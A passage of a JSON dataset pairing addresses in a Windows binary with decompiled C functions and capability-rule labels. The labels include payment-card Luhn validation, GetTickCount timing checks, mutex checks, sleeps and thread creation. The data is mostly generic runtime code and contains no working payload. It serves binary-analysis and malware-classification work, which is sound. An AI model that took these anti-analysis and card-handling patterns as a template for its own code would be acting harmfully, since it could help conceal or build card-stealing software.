            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045108f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0045500d(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004016b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016b0(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004254c0(param_1);\n    fcn.00404ad0(uVar1);\n    fcn.00404ad0();\n    fcn.00404ad0();\n    fcn.00404ad0();\n    fcn.00404ad0();\n    fcn.00404ad0();\n    fcn.00421541();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 208
    },
    "00421541": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421541(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        if (iVar1 < 8) {\n            fcn.0042727d(iVar1 * 0x18 + 0x494e20);\n        }\n        return;\n    }\n    fcn.00456b42(4);\n    return;\n}\n",
        "token_count": 102
    },
    "00445795": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00445795(void)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4706e0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0043cd41(uVar1);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 132
    },
    "00404990": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00404990(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.00405fb0();\n    piVar2 = fcn.00404940();\n    var_8h = *piVar1 != *piVar2;\n    return piVar2 & 0xffffff00 | var_8h;\n}\n",
        "token_count": 106
    },
    "00404d40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d40(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404d90();\n    if (uVar1 < arg_8h) {\n        fcn.004065c0(arg_8h - uVar1, arg_ch & 0xffff);\n    }\n    else {\n        fcn.00406450(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00408f30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t __cdecl fcn.00408f30(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h < 0x100) && (arg_8h._0_2_ = *(in_ECX + arg_8h),  arg_8h != 0)) {\n        var_4h._0_1_ = 1;\n    }\n    else {\n        var_4h._0_1_ = 0;\n    }\n    return arg_8h & 0xff00 | var_4h;\n}\n",
        "token_count": 151
    },
    "004092c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004092c0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar3 = fcn.00404960();\n    if ((*(iVar3 + 0x10) <= arg_8h) && (*(iVar3 + 0x14) != arg_8h)) {\n        if (*(iVar3 + 0x14) < arg_8h) {\n            iVar1 = *(iVar3 + 0x10);\n            fcn.00409b20(arg_8h - iVar1, 0);\n            *(iVar3 + 0x10) = iVar1;\n        }\n        else if ((arg_8h < 8) && (cVar2 = fcn.004073a0(),  cVar2 != '\\0')) {\n            fcn.00409640();\n        }\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "004094a0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004094a0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar3 = fcn.00404960();\n    if ((*(iVar3 + 0x10) <= arg_8h) && (*(iVar3 + 0x14) != arg_8h)) {\n        if (*(iVar3 + 0x14) < arg_8h) {\n            iVar1 = *(iVar3 + 0x10);\n            fcn.00409c60(arg_8h - iVar1, 0);\n            *(iVar3 + 0x10) = iVar1;\n        }\n        else if ((arg_8h < 0x10) && (cVar2 = fcn.00406290(),  cVar2 != '\\0')) {\n            fcn.00406950();\n        }\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00409af0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409af0(uint32_t arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h * 0x18;\n    if (0xaaaaaaa < arg_8h) {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 88
    },
    "0040f330": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f330(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040f310();\n    uVar2 = fcn.00402930();\n    var_8h = uVar1 == uVar2;\n    return uVar2 & 0xffffff00 | var_8h;\n}\n",
        "token_count": 103
    },
    "00410250": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410250(uint32_t arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h * 0x68;\n    if (0x2762762 < arg_8h) {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 88
    },
    "00410320": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00410320(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *in_ECX == *arg_8h;\n    return in_ECX & 0xffffff00 | var_4h;\n}\n",
        "token_count": 82
    },
    "00417a20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417a20(uint32_t arg_8h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h << 2;\n    if (0x3fffffff < arg_8h) {\n        var_4h = -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 86
    },
    "0041d2b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041d2b0(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    piVar1 = fcn.004072d0();\n    piVar2 = fcn.00404940();\n    var_8h = *piVar1 == *piVar2;\n    return piVar2 & 0xffffff00 | var_8h;\n}\n",
        "token_count": 109
    },
    "0041d470": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041d470(uint32_t *arg_8h)\n\n{\n    uint32_t *in_ECX;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00401430(arg_8h);\n    var_8h = *in_ECX == *arg_8h;\n    return *in_ECX & 0xffffff00 | var_8h;\n}\n",
        "token_count": 96
    },
    "0041f780": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041f7ce)\n\nuint32_t __cdecl fcn.0041f780(uint arg_8h, uint arg_ch)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.0041d450();\n    iVar2 = fcn.0041d450();\n    var_4h = iVar1 < iVar2;\n    return iVar1 >> 0x20 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 176
    },
    "00421754": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421754(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_8h_01;\n    uint *in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = in_ECX[4];\n    if (arg_8h <= 0x7fffffffU - var_8h) {\n        var_4h = in_ECX[5];\n        arg_8h_00 = var_8h + arg_8h;\n        iVar3 = fcn.00409410(arg_8h_00);\n        arg_8h_01 = fcn.00408d10(iVar3 + 1);\n        uVar2 = var_4h;\n        in_ECX[4] = arg_8h_00;\n        in_ECX[5] = iVar3;\n        if (var_4h < 0x10) {\n            fcn.00421c4c(arg_8h_01, in_ECX, var_8h, arg_10h, arg_14h, arg_18h);\n        }\n        else {\n            arg_ch_00 = *in_ECX;\n            fcn.00421c4c(arg_8h_01, arg_ch_00, var_8h, arg_10h, arg_14h, arg_18h);\n            var_4h = uVar2 + 1;\n            var_8h = arg_ch_00;\n            if (0xfff < var_4h) {\n                fcn.00401470(&var_8h, &var_4h);\n            }\n            fcn.0043a7bc(var_8h);\n        }\n        *in_ECX = arg_8h_01;\n        return;\n    }\n    fcn.00409220();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 489
    },
    "00429829": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "hash data using fnv"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00429829(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t *in_ECX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    uVar2 = ~-(arg_ch < arg_8h) & arg_ch - arg_8h;\n    if (uVar2 == 0) {\n        uVar1 = *in_ECX;\n    }\n    else {\n        do {\n            uVar1 = (*arg_8h ^ *in_ECX) * 0x1000193;\n            arg_8h = arg_8h + 1;\n            uVar3 = uVar3 + 1;\n            *in_ECX = uVar1;\n        } while (uVar3 != uVar2);\n    }\n    return uVar1;\n}\n",
        "token_count": 205
    },
    "0043d193": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043d193(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    uint *arg_8h_01;\n    uint arg_ch;\n    uint var_10h;\n    uint var_ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetLogicalProcessorInformation)(0, arg_8h);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar2 == 0x7a) {\n        iVar2 = fcn.00455a3e(*arg_8h);\n        if (iVar2 == 0) {\n            fcn.004255d9();\n            arg_ch = 0x48c8fc;\n            arg_8h_01 = &var_ch;\n            goto code_r0x0043d215;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLogicalProcessorInformation)(iVar2, arg_8h);\n        if (iVar3 != 0) {\n            return iVar2;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    if (0 < arg_8h_00) {\n        arg_8h_00 = arg_8h_00 & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h_00);\n    arg_ch = 0x48de6c;\n    arg_8h_01 = &var_10h;\ncode_r0x0043d215:\n    fcn.00451487(arg_8h_01, arg_ch);\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 423
    },
    "00443399": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00443399(uint arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *extraout_ECX;\n    char cVar5;\n    int32_t unaff_EBP;\n    ulong uVar6;\n    uint var_1ch;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad3e(0x10);\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    cVar5 = *(unaff_EBP + 8);\n    if (cVar5 != '\\0') {\n        pcVar1 = *(*extraout_ECX + 0x58);\n        (**0x4742a4)();\n        cVar2 = (*pcVar1)();\n        if ((cVar2 != '\\0') &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_InterlockedPopEntrySList)(extraout_ECX + 0x80), \n           (-(iVar3 != 0) & iVar3 - 8U) != 0)) goto code_r0x004434c1;\n        uVar4 = fcn.00445102(1);\n        if (uVar4 != 0) {\n            uVar6 = fcn.0043d380();\n            iVar3 = extraout_ECX[0x74];\n            *(unaff_EBP + -0x14) = uVar6 >> 0x20;\n            if (uVar6 - iVar3 < uVar4) goto code_r0x004434c1;\n            cVar5 = '\\0';\n        }\n    }\n    LOCK();\n    extraout_ECX[100] = extraout_ECX[100] + 1;\n    if (cVar5 == '\\0') {\n        uVar6 = fcn.0043d380();\n        extraout_ECX[0x74] = uVar6;\n        extraout_ECX[0x75] = uVar6 >> 0x20;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_InterlockedPopEntrySList)(extraout_ECX + 0x7a);\n    uVar4 = -(iVar3 != 0) & iVar3 - 8U;\n    *(unaff_EBP + -0x14) = uVar4;\n    if (uVar4 == 0) {\n        pcVar1 = *(*extraout_ECX + 0x40);\n        (**0x4742a4)();\n        uVar4 = (*pcVar1)();\n        *(unaff_EBP + -0x14) = uVar4;\n        fcn.00442462(uVar4);\n        LOCK();\n        extraout_ECX[0x62] = extraout_ECX[0x62] + 1;\n    }\n    fcn.0044bd79();\n    *(unaff_EBP + -4) = 0;\n    *(uVar4 + 0x9c) = 0;\n    pcVar1 = *(*extraout_ECX[0x6b] + 8);\n    (**0x4742a4)(uVar4);\n    (*pcVar1)();\n    if (uVar4 != 0) {\n        *(uVar4 + 0x10) = 0;\n        *(uVar4 + 0x14) = 0;\n    }\ncode_r0x004434c1:\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 787
    },
    "00450bc1": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00450bc1(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_ECX;\n    uint var_10h;\n    uint var_4h;\n    \n    iVar2 = fcn.00442fb0(0, *(arg_ch + 0x78), &var_4h);\n    do {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        if (iVar2 != arg_10h) {\n            uVar1 = *(in_ECX + 0x14);\n            if (100 < *(in_ECX + 0x10) - *(iVar2 + 200)) {\n                *(iVar2 + 200) = *(in_ECX + 0x10);\n                *(iVar2 + 0xcc) = uVar1;\n            }\n            iVar2 = fcn.00450c42();\n            if (iVar2 != 0) {\n                puVar3 = fcn.0044f6eb(iVar2);\n                *arg_8h = *puVar3;\n                arg_8h[1] = puVar3[1];\n                arg_8h[2] = puVar3[2];\n                return 1;\n            }\n        }\n        iVar2 = fcn.004435d1(&var_4h, 0);\n    } while( true );\n}\n",
        "token_count": 328
    },
    "0046f31a": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0046f31a(void)\n\n{\n    *0x491940 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "0043c923": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0043c923(uint *param_1)\n\n{\n    param_1[6] = 0;\n    param_1[7] = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 2;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    return param_1;\n}\n",
        "token_count": 112
    },
    "0042ef0b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ef0b(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad3e(8);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    uVar1 = *(unaff_EBP + 8);\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004279b0(0, uVar1);\n    uVar1 = fcn.00439ac7();\n    *(extraout_ECX + 0x14) = uVar1;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 236
    },
    "0042ef55": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042ef55(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad3e(8);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    uVar1 = *(unaff_EBP + 8);\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.00427a1d(0, uVar1);\n    uVar1 = fcn.00439ac7();\n    *(extraout_ECX + 0x14) = uVar1;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 236
    },
    "00436ff8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00436ff8(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0043ad3e(8);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    uVar1 = *(unaff_EBP + 8);\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0xc) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.00435717(0, uVar1);\n    uVar1 = fcn.00439ac7();\n    *(extraout_ECX + 0x14) = uVar1;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 234
    },
    "0044c812": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0044c812(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    pcVar1 = *(unaff_EBP + 8);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    *extraout_ECX = vtable.Concurrency::details::ScheduleGroupBase.0;\n    extraout_ECX[1] = pcVar1;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    *(unaff_EBP + -4) = 0;\n    extraout_ECX[5] = 0x1;\n    fcn.0044546b(arg_8h_00);\n    pcVar1 = fcn.004434d6();\n    extraout_ECX[7] = pcVar1;\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 352
    },
    "0043d39a": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043d39a(uint hObject, uint Callback, uint Context)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint var_14h;\n    uint phNewWaitObject;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_RegisterWaitForSingleObject)\n                      (&phNewWaitObject, hObject, Callback, Context, 0xffffffff, 0xc);\n    if (iVar2 != 0) {\n        return phNewWaitObject;\n    }\n    arg_8h = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < arg_8h) {\n        arg_8h = arg_8h & 0xffff | 0x80070000;\n    }\n    fcn.00445579(arg_8h);\n    fcn.00451487(&var_14h, 0x48de6c);\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0043d474": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d474(uint hObjectToSignal, uint hObjectToWaitOn, uint dwMilliseconds, uint bAlertable)\n\n{\n    (*_sym.imp.KERNEL32.dll_SignalObjectAndWait)(hObjectToSignal, hObjectToWaitOn, dwMilliseconds, bAlertable);\n    return;\n}\n",
        "token_count": 67
    },
    "0043d48b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d48b(uint dwMilliseconds)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n    return;\n}\n",
        "token_count": 36
    },
    "0043d54c": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d54c(uint hHandle, uint dwMilliseconds)\n\n{\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObjectEx)(hHandle, dwMilliseconds, 0);\n    return;\n}\n",
        "token_count": 50
    },
    "0041c3d0": {
        "rules": [
            "check mutex"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c3d0(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.00404db0();\n        iVar3 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, uVar2);\n        if (iVar3 == 0) {\n            uVar2 = fcn.00404db0();\n            (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, uVar2);\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 174
    },
    "0043b789": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b789(int32_t param_1)\n\n{\n    while (*(param_1 + 0x14) < *(param_1 + 0x18)) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n        fcn.0043baa0();\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n    return;\n}\n",
        "token_count": 111
    },
    "0043d105": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043d105(uint lpThreadAttributes, uint dwStackSize, uint lpStartAddress, uint lpParameter, uint dwCreationFlags, \n            uint lpThreadId)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateThread)\n              (lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);\n    return;\n}\n",
        "token_count": 80
    },
    "004108f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004108f0(uint param_1)\n\n{\n    char cVar1;\n    uint arg_ch;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h_2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h_2;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470c10;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    fcn.00401b10(4);\n    var_4h = 0;\n    while( true ) {\n        cVar1 = fcn.00410df0(&var_10h_2);\n        if (cVar1 == '\\0') break;\n        arg_ch = fcn.0040edd0();\n        fcn.004101f0(var_8h, arg_ch);\n        fcn.0040f710();\n    }\n    var_4h = 0xffffffff;\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0043a2e7(unaff_ESI);\n    return;\n}\n",
        "token_count": 326
    },
    "004173f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004173f0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_4h;\n    \n    while( true ) {\n        cVar1 = fcn.00413460();\n        if (cVar1 != '\\0') break;\n        fcn.004122e0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "004300bd": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004300bd(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint16_t *arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.004294ea(*arg_18h);\n            arg_18h = arg_18h + 1;\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 147
    },
    "00430c34": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430c34(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.004294ea(arg_14h);\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 126
    },
    "00430c60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430c60(uint noname_0, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    if (arg_1ch != 0) {\n        do {\n            fcn.004294ea(arg_18h);\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 130
    },
    "0043d843": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d843(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    \n    fcn.0044646e();\n    iVar1 = *param_1;\n    *param_1 = 1;\n    while (iVar1 != 0) {\n        fcn.0043bebc(unaff_ESI);\n        iVar1 = *param_1;\n        *param_1 = 1;\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0043e210": {
        "rules": [
            "contain loop"
        ],
